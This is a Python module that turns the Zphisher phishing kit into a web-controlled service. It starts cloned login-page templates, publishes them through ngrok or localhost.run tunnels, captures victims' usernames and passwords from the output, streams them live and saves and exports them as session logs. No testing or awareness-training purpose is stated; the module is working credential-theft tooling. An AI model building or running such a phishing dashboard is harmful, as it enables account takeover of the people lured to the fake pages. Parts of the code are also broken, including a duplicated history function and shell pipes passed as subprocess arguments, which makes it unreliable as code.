import os
import subprocess
import threading
import time
import re
import uuid
import platform
import json
from datetime import datetime

ZPHISHER_PATH = os.path.join(os.path.dirname(__file__), 'zphisher', 'zphisher.sh')

sessions = {}
sessions_lock = threading.Lock()
socketio = None  # Will be set by app.py

# Session history (in-memory)
history = []

HISTORY_FILE = os.path.join(os.path.dirname(__file__), 'zphisher_history.json')

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return []
    with open(HISTORY_FILE, 'r') as f:
        try:
            return json.load(f)
        except Exception:
            return []

def save_history(history):
    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def add_session_to_history(session_id, session):
    history = load_history()
    entry = {
        'session_id': session_id,
        'template': session['template'],
        'tunnel_type': session['tunnel_type'],
        'public_url': session['public_url'],
        'start_time': session.get('start_time'),
        'stop_time': session.get('stop_time'),
        'status': session['status'],
        'credentials': session['credentials'],
        'output': session['output'],
    }
    # Remove old entry if exists
    history = [h for h in history if h['session_id'] != session_id]
    history.insert(0, entry)
    save_history(history)

def get_history():
    return load_history()

def get_session_detail(session_id):
    history = load_history()
    for h in history:
        if h['session_id'] == session_id:
            return h
    return None

def export_session(session_id, export_type):
    session = get_session_detail(session_id)
    if not session:
        return None, None
    if export_type == 'output':
        content = '\n'.join(session['output'])
        filename = f'zphisher_output_{session_id}.txt'
    elif export_type == 'credentials':
        content = '\n'.join(session['credentials'])
        filename = f'zphisher_credentials_{session_id}.txt'
    else:
        return None, None
    return content, filename

def is_windows():
    return os.name == 'nt' or platform.system().lower().startswith('win')

def run_bash_command(cmd_list):
    if is_windows():
        # Use WSL for Windows
        cmd = ['wsl'] + cmd_list
    else:
        cmd = cmd_list
    return cmd

def check_ngrok_available():
    try:
        # Check if ngrok is installed and accessible
        result = subprocess.run(
            run_bash_command(['ngrok', 'version']), 
            capture_output=True, 
            text=True, 
            timeout=10
        )
        
        if result.returncode == 0:
            print(f"ngrok version: {result.stdout.strip()}")
            return True
        else:
            print(f"ngrok check failed: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("ngrok not found in PATH")
        return False
    except subprocess.TimeoutExpired:
        print("ngrok version check timed out")
        return False
    except Exception as e:
        print(f"ngrok availability check error: {e}")
        return False

def check_ssh_available():
    try:
        result = subprocess.run(run_bash_command(['ssh', '-V']), capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except Exception:
        return False

def install_ngrok():
    """Attempt to install ngrok if not available"""
    try:
        import platform
        system = platform.system().lower()
        
        if system == 'linux':
            # Download and install ngrok for Linux
            print("Installing ngrok for Linux...")
            subprocess.run([
                'curl', '-s', 'https://ngrok-agent.s3.amazonaws.com/ngrok.asc', '|', 'sudo', 'tee', '/etc/apt/trusted.gpg.d/ngrok.asc', '>', '/dev/null'
            ], check=True)
            subprocess.run([
                'echo', '"deb https://ngrok-agent.s3.amazonaws.com buster main"', '|', 'sudo', 'tee', '/etc/apt/sources.list.d/ngrok.list'
            ], check=True)
            subprocess.run(['sudo', 'apt', 'update'], check=True)
            subprocess.run(['sudo', 'apt', 'install', 'ngrok'], check=True)
            print("ngrok installed successfully!")
            return True
        elif system == 'darwin':  # macOS
            print("Installing ngrok for macOS...")
            subprocess.run(['brew', 'install', 'ngrok/ngrok/ngrok'], check=True)
            print("ngrok installed successfully!")
            return True
        elif system == 'windows':
            print("Installing ngrok for Windows...")
            import tempfile
            import zipfile
            import urllib.request
            
            # Download ngrok for Windows
            ngrok_url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, "ngrok.zip")
            
            print("Downloading ngrok...")
            urllib.request.urlretrieve(ngrok_url, zip_path)
            
            # Extract ngrok
            print("Extracting ngrok...")
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            # Move ngrok.exe to a directory in PATH
            ngrok_exe = os.path.join(temp_dir, "ngrok.exe")
            if os.path.exists(ngrok_exe):
                # Try to copy to a directory in PATH
                import shutil
                import sys
                
                # Common Windows PATH directories
                path_dirs = [
                    os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'ngrok'),
                    os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local')), 'ngrok'),
                    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~\\AppData\\Roaming')), 'ngrok'),
                    os.path.expanduser('~\\ngrok')
                ]
                
                installed = False
                for path_dir in path_dirs:
                    try:
                        os.makedirs(path_dir, exist_ok=True)
                        dest_path = os.path.join(path_dir, "ngrok.exe")
                        shutil.copy2(ngrok_exe, dest_path)
                        
                        # Add to PATH if not already there
                        current_path = os.environ.get('PATH', '')
                        if path_dir not in current_path:
                            os.environ['PATH'] = current_path + os.pathsep + path_dir
                        
                        print(f"ngrok installed to: {dest_path}")
                        print("Please add this directory to your PATH environment variable:")
                        print(f"  {path_dir}")
                        installed = True
                        break
                    except Exception as e:
                        print(f"Failed to install to {path_dir}: {e}")
                        continue
                
                if not installed:
                    print("Failed to install ngrok to any directory in PATH")
                    print(f"ngrok.exe is available at: {ngrok_exe}")
                    print("Please manually add it to your PATH")
                    return False
                
                # Clean up
                try:
                    os.remove(zip_path)
                    os.remove(ngrok_exe)
                except:
                    pass
                
                print("ngrok installed successfully!")
                return True
            else:
                print("Failed to extract ngrok.exe")
                return False
        else:
            print(f"Automatic ngrok installation not supported for {system}")
            print("Please install ngrok manually from https://ngrok.com/download")
            return False
            
    except Exception as e:
        print(f"Failed to install ngrok: {e}")
        print("Please install ngrok manually from https://ngrok.com/download")
        return False

def start_tunnel(tunnel_type, port):
    if tunnel_type == 'ngrok':
        # Check if ngrok is available
        if not check_ngrok_available():
            raise Exception("ngrok is not available. Please install ngrok first.")
        
        # Set ngrok auth token if available
        ngrok_token = os.environ.get('NGROK_AUTHTOKEN')
        if ngrok_token:
            try:
                subprocess.run(run_bash_command(['ngrok', 'authtoken', ngrok_token]), 
                             capture_output=True, text=True, timeout=10, check=False)
            except Exception as e:
                print(f"Warning: Failed to set ngrok auth token: {e}")
        
        # Start ngrok tunnel
        try:
            tunnel_proc = subprocess.Popen(
                run_bash_command(['ngrok', 'http', str(port), '--log=stdout']), 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True
            )
            
            # Wait for ngrok to start and get the public URL
            url = None
            max_attempts = 30
            
            for attempt in range(max_attempts):
                try:
                    import requests
                    resp = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    if resp.status_code == 200:
                        tunnels = resp.json().get('tunnels', [])
                        for tunnel in tunnels:
                            if tunnel.get('proto') == 'https':
                                url = tunnel.get('public_url')
                                if url:
                                    print(f"ngrok tunnel established: {url}")
                                    break
                        if url:
                            break
                except Exception as e:
                    print(f"Attempt {attempt + 1}: Waiting for ngrok tunnel... ({e})")
                
                time.sleep(1)
            
            if not url:
                # Try to get URL from ngrok output
                tunnel_proc.terminate()
                raise Exception("Failed to establish ngrok tunnel after 30 seconds")
            
            return tunnel_proc, url
            
        except Exception as e:
            raise Exception(f"Failed to start ngrok tunnel: {e}")
    elif tunnel_type == 'localhost.run':
        tunnel_proc = subprocess.Popen(run_bash_command(['ssh', '-o', 'StrictHostKeyChecking=no', '-R', f'80:localhost:{port}', 'nokey@localhost.run']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        url = None
        for _ in range(30):
            line = tunnel_proc.stdout.readline()
            if 'https://' in line:
                url = re.search(r'(https://[\w.-]+\.localhost\.run)', line)
                if url:
                    url = url.group(1)
                    break
            time.sleep(1)
        return tunnel_proc, url
    else:
        raise ValueError('Unsupported tunnel type')

def start_zphisher(template, tunnel_type):
    session_id = str(uuid.uuid4())
    port = 8080 + int(session_id[-4:], 16) % 1000
    zphisher_cmd = run_bash_command(['bash', ZPHISHER_PATH])
    zphisher_proc = subprocess.Popen(zphisher_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    tunnel_proc, public_url = start_tunnel(tunnel_type, port)
    output = []
    credentials = []
    start_time = datetime.now().isoformat()
    def read_output():
        while True:
            line = zphisher_proc.stdout.readline()
            if not line:
                break
            output.append(line.strip())
            if 'username:' in line.lower() or 'password:' in line.lower():
                credentials.append(line.strip())
            if socketio:
                socketio.emit('zphisher_output', {
                    'session_id': session_id,
                    'line': line.strip(),
                    'credentials': credentials[-1] if credentials else None
                }, room=session_id)
    thread = threading.Thread(target=read_output, daemon=True)
    thread.start()
    with sessions_lock:
        sessions[session_id] = {
            'zphisher_proc': zphisher_proc,
            'tunnel_proc': tunnel_proc,
            'output': output,
            'credentials': credentials,
            'public_url': public_url,
            'status': 'running',
            'template': template,
            'tunnel_type': tunnel_type,
            'thread': thread,
            'start_time': start_time,
            'stop_time': None
        }
    return session_id

def get_status(session_id):
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return None
        return {
            'output': session['output'],
            'credentials': session['credentials'],
            'public_url': session['public_url'],
            'status': session['status'],
            'template': session['template'],
            'tunnel_type': session['tunnel_type']
        }

def stop_session(session_id):
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return False
        if session['zphisher_proc']:
            session['zphisher_proc'].terminate()
        if session['tunnel_proc']:
            session['tunnel_proc'].terminate()
        session['status'] = 'stopped'
        session['stop_time'] = datetime.now().isoformat()
        add_session_to_history(session_id, session)
        return True

def fetch_zphisher_templates():
    """
    Fetch Zphisher templates by reading the 'sites' or '.sites' directory inside Zphisher.
    Handles WSL/Windows/VS Code discrepancies by checking both possible directory names.
    Logs all steps and errors using app.logger.
    Returns an empty list if no templates are found after initialization.
    """
    import os
    import subprocess
    from flask import current_app as app
    ZPHISHER_DIR = os.path.dirname(ZPHISHER_PATH)
    app.logger.info(f"Contents of {ZPHISHER_DIR}: {os.listdir(ZPHISHER_DIR)}")
    template_dir = None
    for candidate in ['sites', '.sites']:
        candidate_path = os.path.join(ZPHISHER_DIR, candidate)
        if os.path.exists(candidate_path):
            template_dir = candidate_path
            break
    if not template_dir:
        app.logger.warning("No 'sites' or '.sites' directory found. Running zphisher.sh to initialize.")
        try:
            proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            proc.communicate(timeout=30)
        except Exception as e:
            app.logger.error(f"Failed to run zphisher.sh: {e}")
        # Try again
        for candidate in ['sites', '.sites']:
            candidate_path = os.path.join(ZPHISHER_DIR, candidate)
            if os.path.exists(candidate_path):
                template_dir = candidate_path
                break
    if not template_dir:
        app.logger.error("Still no 'sites' or '.sites' directory found after initialization.")
        return []
    app.logger.info(f"Using template directory: {template_dir}")
    app.logger.info(f"Contents of {template_dir}: {os.listdir(template_dir)}")
    templates = [entry for entry in os.listdir(template_dir) if os.path.isdir(os.path.join(template_dir, entry)) and not entry.startswith('.')]
    if not templates:
        app.logger.warning(f"No templates found in {template_dir}")
    else:
        app.logger.info(f"Found templates: {templates}")
    return templates

def get_history():
    with sessions_lock:
        return [
            {
                'session_id': s['session_id'],
                'template': s['template'],
                'tunnel_type': s['tunnel_type'],
                'public_url': s['public_url'],
                'status': s['status'],
                'credentials_count': len(s['credentials']),
                'start_time': s.get('start_time'),
                'end_time': s.get('end_time')
            }
            for s in history
        ]

def get_history_detail(session_id):
    with sessions_lock:
        for s in history:
            if s['session_id'] == session_id:
                return {
                    'session_id': s['session_id'],
                    'template': s['template'],
                    'tunnel_type': s['tunnel_type'],
                    'public_url': s['public_url'],
                    'status': s['status'],
                    'credentials': s['credentials'],
                    'output': s['output'],
                    'start_time': s.get('start_time'),
                    'end_time': s.get('end_time')
                }
        return None

def export_session_log(session_id):
    detail = get_history_detail(session_id)
    if not detail:
        return None
    log = f"Session ID: {detail['session_id']}\nTemplate: {detail['template']}\nTunnel: {detail['tunnel_type']}\nStatus: {detail['status']}\nPhishing Link: {detail['public_url']}\nStart Time: {detail['start_time']}\nEnd Time: {detail['end_time']}\n\n--- Output ---\n" + '\n'.join(detail['output']) + "\n\n--- Credentials ---\n" + '\n'.join(detail['credentials'])
    return log 